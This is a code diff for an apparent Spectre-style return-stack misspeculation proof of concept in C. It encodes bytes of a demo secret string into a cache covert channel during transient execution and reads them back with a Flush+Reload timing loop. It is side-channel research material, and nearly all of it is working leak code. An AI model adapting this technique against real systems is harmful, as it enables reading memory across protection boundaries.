@@ -9,6 +9,15 @@
 
 
 #define CACHE_MISS 80
+char* channel;
+int pagesize = 4096;
+
+// 698: call_start
+// 688: call_leak
+// 678: call_manipulate
+
+inline void __attribute__((__always_inline__)) maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }
+
 
 // Pop return address from the software stack, causing misspeculation when hitting the return
 int __attribute__ ((noinline)) call_manipulate_stack() {
@@ -22,7 +31,7 @@ int __attribute__ ((noinline)) call_manipulate_stack() {
   return 0;
 }
 
-int __attribute__ ((noinline)) call_leak(fr_channel *channel, char s) {
+int __attribute__ ((noinline)) call_leak(char s) {
   // Manipulate the stack so that we don't return here, but to call_start
   //maccess(&secret);
   //maccess(probe_buf);
@@ -33,14 +42,14 @@ int __attribute__ ((noinline)) call_leak(fr_channel *channel, char s) {
   // architecturally, this is never executed
   // Encode data in covert channel
   
-  printf("a");
-  //encode(channel,s);
+  //encode(channel,s, pagesize);
+  maccess(channel + s * pagesize);
   _mm_mfence();
   return 2;
 }
 
-int __attribute__ ((noinline)) call_start(fr_channel *channel, char s) {
-  call_leak(channel, s);
+int __attribute__ ((noinline)) call_start(char s) {
+  call_leak(s);
   _mm_mfence();
   return 1;
 }
@@ -49,16 +58,10 @@ void confuse_compiler() {
   // this function -- although never called -- is required
   // otherwise, the compiler replaces the calls with jumps
   char s = 'A';
-  fr_channel *channel;
-  channel = malloc(sizeof(fr_channel));
 
-    make_channel(channel);
-
-  call_start(0,s);
-  call_leak(0,s);
+  call_start(s);
+  call_leak(s);
   call_manipulate_stack();
-  free_channel(channel);
-  free(channel);
 
 }
 
@@ -66,29 +69,45 @@ int main(int argc, const char **argv) {
   // Detect cache threshold
   char* secret = "foobar";
   size_t secret_size = 6;
+  int mix_i;
+  int i, j;
+  char* addr;
+  char cc;
 
-    static fr_channel *channel;
-    channel = malloc(sizeof(fr_channel));
-
-    make_channel(channel);
+  channel = malloc(256 * pagesize);
+  memset(channel, 1, 256*pagesize);
+  flush(channel, pagesize);
 
   _mm_mfence();
   for (int p =0; p < 8; p++) { // ! introducing for loop changes where a hit is measured
     _mm_mfence();
     // for every byte in the string
     
-    
-    call_start(channel,secret[p % secret_size]);
-    //call_start(channel,'A');
+
+    cc = secret[p % secret_size];
+    _mm_mfence();
+    call_start(cc);
+    //call_start('D');
     _mm_mfence();
 
     // Recover data from covert channel
     
-    printf("hit at %d: '%c'\n",probe(channel,CACHE_MISS));
+    //printf("hit at %d\n",probe(channel,CACHE_MISS, pagesize));
+    for (i = 0; i < 256; i++) {
+      mix_i = ((i * 167) + 13) & 255;
+      if (32 > mix_i || mix_i > 126){
+          continue;
+      }
+      addr = channel + mix_i * pagesize;
+      if (flush_reload_t(addr) <= CACHE_MISS){
+          printf("%c\n", mix_i);
+          //results[mix_i]++;
+      }
+      _mm_mfence();
+    }
 
     _mm_mfence();
   }
-  free_channel(channel);
   free(channel);
 
   return (0);
